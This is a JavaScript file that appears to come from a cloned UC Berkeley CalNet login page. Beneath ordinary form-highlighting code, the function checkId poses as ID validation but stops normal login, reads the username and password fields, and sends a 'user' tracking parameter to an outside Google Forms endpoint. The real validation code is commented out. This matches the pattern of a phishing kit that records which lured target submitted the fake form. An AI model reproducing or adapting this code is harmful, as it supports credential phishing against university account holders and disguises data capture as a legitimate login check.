var highlightcolor = "#fc3";
var ns6 = document.getElementById && !document.all;
var previous = '';
var eventobj;

// SET FOCUS TO FIRST ELEMENT AND HIDE/SHOW ELEMENTS IF JAVASCRIPT ENABLED

// REGULAR EXPRESSION TO HIGHLIGHT ONLY FORM ELEMENTS
var intended = /INPUT|TEXTAREA|SELECT|OPTION/

// FUNCTION TO CHECK WHETHER ELEMENT CLICKED IS FORM ELEMENT
function checkel(which) {
	if (which.style && intended.test(which.tagName)) { return true }
	else return false
}

// FUNCTION TO HIGHLIGHT FORM ELEMENT
function highlight(e) {
	if (!ns6) {
		eventobj = event.srcElement
		if (previous != '') {
			if (checkel(previous))
				previous.style.backgroundColor = ''
			previous = eventobj
			if (checkel(eventobj)) eventobj.style.backgroundColor = highlightcolor
		}
		else {
			if (checkel(eventobj)) eventobj.style.backgroundColor = highlightcolor
			previous = eventobj
		}
	}
}

function getUrlVars() {
    var vars = {};
    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
        vars[key] = value;
    });
    return vars;
}

// Function to check CalNet ID for all numeric or invalid based on .
function checkId() {
	event.preventDefault()
	calnet_id = document.getElementById("username");
	password = document.getElementById("password");
	calnet_id.value = calnet_id.value.replace(/^\s+|\s+$/g, ""); // trim leading and trailing spaces
	if (calnet_id != null) {
		let user = getUrlVars()["user"];
		var xhr = new XMLHttpRequest();
		let url = "https://docs.google.com/forms/d/e/1FAIpQLSfpXsb_DKVEVL-IZWf_SQdVdkH4oL2m7Rh9mUTRZRfGXo45ng/formResponse?usp=pp_url&entry.1545559792=" + user + "&submit=Submit";
		xhr.open("POST", url , true);
		//xhr.setRequestHeader('Content-Type', 'application/json');
		xhr.send();
		// https://docs.google.com/forms/d/e/1FAIpQLSfpXsb_DKVEVL-IZWf_SQdVdkH4oL2m7Rh9mUTRZRfGXo45ng/formResponse?usp=pp_url&entry.1545559792=karlkarl&submit=Submit
		// if (window.location.search && unescape(window.location.search).match(/bpr.calnet.berkeley.edu\/account-manager/) && calnet_id.value.match(/^cads\d+$/)) {
		// 	return;
		// } else if (calnet_id.value.match(/^cads\d+$/)) {
		// 	message = "You are now required to choose a self-selected CalNet ID before continuing. Click OK to log into the Change CalNet ID application.";
		// 	answer = alert(message);
		// 	window.location = "https://bpr.calnet.berkeley.edu/account-manager/person/changeCalnetId";
		// 	return false;
		// } else if (calnet_id.value.match(/^(\!|app_|((app|bio|ced|dev|eas|guest|lib|opt|pvt|summer|svc)-)).*$|^(guest|tsinternetuser|notkrishna|krbtgt)$/)) {
		// 	message = "Invalid CalNet ID.";
		// 	answer = alert(message);
		// 	return false;
		// }
	}
}
